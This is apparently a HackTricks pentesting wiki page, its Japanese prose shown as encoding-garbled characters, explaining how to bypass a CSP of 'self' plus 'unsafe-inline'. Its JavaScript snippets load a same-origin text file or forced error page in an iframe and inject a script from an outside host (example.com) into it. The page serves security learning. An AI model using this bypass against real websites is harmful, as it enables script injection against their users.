{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


æ¬¡ã®ã‚ˆã†ãªè¨­å®šï¼š
```
Content-Security-Policy: default-src 'self' 'unsafe-inline';
```
ã‚³ãƒ¼ãƒ‰ã‚’æ–‡å­—åˆ—ã¨ã—ã¦é€ä¿¡ã™ã‚‹é–¢æ•°ã®ä½¿ç”¨ã‚’ç¦æ­¢ã—ã¾ã™ã€‚ä¾‹ãˆã°ï¼š`eval, setTimeout, setInterval` ã¯ã™ã¹ã¦ `unsafe-eval` ã®è¨­å®šã«ã‚ˆã‚Šãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã¾ã™ã€‚

å¤–éƒ¨ã‚½ãƒ¼ã‚¹ã‹ã‚‰ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚‚ã™ã¹ã¦ãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã¯ç”»åƒã€CSSã€WebSocketsã€ç‰¹ã«JSãŒå«ã¾ã‚Œã¾ã™ã€‚

### ãƒ†ã‚­ã‚¹ãƒˆã¨ç”»åƒã‚’ä»‹ã—ã¦

ç¾ä»£ã®ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã€è¡¨ç¤ºã‚’å‘ä¸Šã•ã›ã‚‹ãŸã‚ã«ç”»åƒã‚„ãƒ†ã‚­ã‚¹ãƒˆã‚’HTMLã«å¤‰æ›ã™ã‚‹ã“ã¨ãŒè¦³å¯Ÿã•ã‚Œã¦ã„ã¾ã™ï¼ˆä¾‹ï¼šèƒŒæ™¯ã®è¨­å®šã€ä¸­å¤®æƒãˆãªã©ï¼‰ã€‚ãã®çµæœã€`iframe`ã‚’ä»‹ã—ã¦`favicon.ico`ã‚„`robots.txt`ã®ã‚ˆã†ãªç”»åƒã‚„ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ãŒé–‹ã‹ã‚Œã‚‹ã¨ã€ãã‚Œã¯HTMLã¨ã—ã¦ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã¾ã™ã€‚ç‰¹ã«ã€ã“ã‚Œã‚‰ã®ãƒšãƒ¼ã‚¸ã¯CSPãƒ˜ãƒƒãƒ€ãƒ¼ã‚’æ¬ ã„ã¦ã„ã‚‹ã“ã¨ãŒå¤šãã€X-Frame-OptionsãŒå«ã¾ã‚Œã¦ã„ãªã„å ´åˆãŒã‚ã‚Šã€ãã“ã‹ã‚‰ä»»æ„ã®JavaScriptã‚’å®Ÿè¡Œã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```javascript
frame=document.createElement("iframe");
frame.src="/css/bootstrap.min.css";
document.body.appendChild(frame);
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
### Via Errors

åŒæ§˜ã«ã€ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚„ç”»åƒã®ã‚ˆã†ãªã‚¨ãƒ©ãƒ¼ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯ã€é€šå¸¸CSPãƒ˜ãƒƒãƒ€ãƒ¼ãªã—ã§æä¾›ã•ã‚Œã€X-Frame-Optionsã‚’çœç•¥ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã‚¨ãƒ©ãƒ¼ã¯iframeå†…ã§èª­ã¿è¾¼ã‚€ã‚ˆã†ã«èª˜ç™ºã§ãã€ä»¥ä¸‹ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å¯èƒ½ã«ã—ã¾ã™ï¼š
```javascript
// Inducing an nginx error
frame=document.createElement("iframe");
frame.src="/%2e%2e%2f";
document.body.appendChild(frame);

// Triggering an error with a long URL
frame=document.createElement("iframe");
frame.src="/"+"A".repeat(20000);
document.body.appendChild(frame);

// Generating an error via extensive cookies
for(var i=0;i<5;i++){document.cookie=i+"="+"a".repeat(4000)};
frame=document.createElement("iframe");
frame.src="/";
document.body.appendChild(frame);
// Removal of cookies is crucial post-execution
for(var i=0;i<5;i++){document.cookie=i+"="}
```
æŒ‡å®šã•ã‚ŒãŸã‚·ãƒŠãƒªã‚ªã®ã„ãšã‚Œã‹ã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ãŸå¾Œã€iframeå†…ã§ã®JavaScriptå®Ÿè¡Œã¯æ¬¡ã®ã‚ˆã†ã«å®Ÿç¾ã§ãã¾ã™ï¼š
```javascript
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
## å‚è€ƒæ–‡çŒ®

* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
